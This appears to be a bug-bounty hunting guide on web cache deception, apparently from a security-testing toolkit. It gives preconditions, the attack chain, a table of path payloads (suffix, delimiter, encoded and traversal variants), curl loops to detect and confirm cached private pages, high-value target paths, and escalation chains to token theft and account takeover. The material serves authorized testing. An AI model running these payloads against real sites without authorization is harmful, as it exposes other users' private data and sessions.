# hunt-cache-deception — Web Cache Deception (WCD)

**Source:** `packs/writeups/mastering-web-cache-deception-vulnerabilities-an-advanced-bug-hunter-s-guide.md` (CoffinXP).

## Preconditions (must hold or class is not-applicable)
1. CDN / reverse proxy in front (Cloudflare, Akamai, Fastly, CloudFront, Varnish, Nginx cache).
2. Cache decision is **URL-suffix based** — `.css` / `.js` / `.jpg` / `.png` etc. are cached, dynamic paths are not.
3. Origin **ignores the extra suffix** (framework routes `/account/foo.css` the same as `/account`).

Detect precondition #1: `curl -sI https://TARGET/ | grep -iE 'cf-cache-status|x-cache|age:|via:|cache-control'` — response includes one → CDN present.

## Attack chain
1. Attacker crafts `https://target.com/account/deception.css`.
2. Victim clicks (email/social). Victim's browser sends **authenticated** request (their session cookies attach).
3. Origin sees `/account/deception.css`, ignores the suffix, returns victim's private HTML page.
4. CDN sees `.css` extension → **stores response in cache keyed by URL**.
5. Attacker visits the same URL later, **unauthenticated**. CDN serves cached response → attacker reads victim's private page (session tokens, PII, CSRF tokens).

## Payload set
Full library: `brain/payloads/cache-deception.txt`. Summary:

| Class | Example |
|---|---|
| Static-ext suffix | `/account/style.css`, `/profile.php/poc.css` |
| Path Poison | `/account.css`, `/settings.js` |
| Obfuscated | `/account%2fstyle.css`, `/profile%3ftest=1.js` |
| Delimiter | `/account;random.js`, `/profile@x.css`, `/user,x.png` |
| Traversal | `/settings/%2e%2e/images/logo.png` |
| Query | `/account.css?test=123`, `/settings?theme=dark.css` |
| Header hint | `X-Forwarded-Path: /static.css` |

## Detection ladder
Tier 1 — Static ext at end of path:
```bash
for p in /style.css /main.js /logo.png /favicon.ico; do
  curl -sI -b "session=$COOKIE" "https://TARGET/account$p" | grep -iE 'cache|age:|x-cache|cf-cache'
done
```
Look for `cf-cache-status: HIT` or `x-cache: HIT` or `age: > 0`.

Tier 2 — Verify content leak (the critical proof):
```bash
# Authenticated fetch (populates cache)
curl -s -b "session=$COOKIE" "https://TARGET/account/poc.css" -o auth.html
# Unauthenticated fetch (should now serve cached auth response)
curl -s "https://TARGET/account/poc.css" -o anon.html
# Compare — if anon.html contains YOUR account data → CONFIRMED WCD
diff auth.html anon.html || echo "same → cache-deception vulnerable"
grep -iE 'email|user|csrf|token' anon.html
```

Tier 3 — Delimiter / obfuscation escalation for path-normalizing origins.

Tier 4 — Header-based (`X-Forwarded-Path: /static.css`) if you have a debug/dev endpoint that honors it.

## Impact contract
Not a bug unless you demonstrate:
- Authenticated content is served to an anonymous requester, AND
- The content contains real user data (email, CSRF token, session token, PII, API key).

A `cf-cache-status: HIT` on a public page is not a finding.

## Crown-jewel surfaces
- `/account`, `/profile`, `/settings` — PII
- `/dashboard`, `/admin` — CSRF tokens + JWT in HTML
- `/api/me`, `/api/users/current` — full session context
- `/orders`, `/billing` — financial info

## Chains
- WCD → **session-token exfil** (if page has JWT in HTML) → ATO
- WCD → **CSRF-token exfil** → forge admin action
- WCD → **API-key exposure** (integrations panels) → downstream service pivot
- WCD combined with **cache-poisoning** (`brain/payloads/cache-poison.txt`) → mass victim compromise

## Router pointer
Class row in `references/router.md`: **Cache deception** → payload `cache-deception` + depth `hunt-cache-deception.md`.
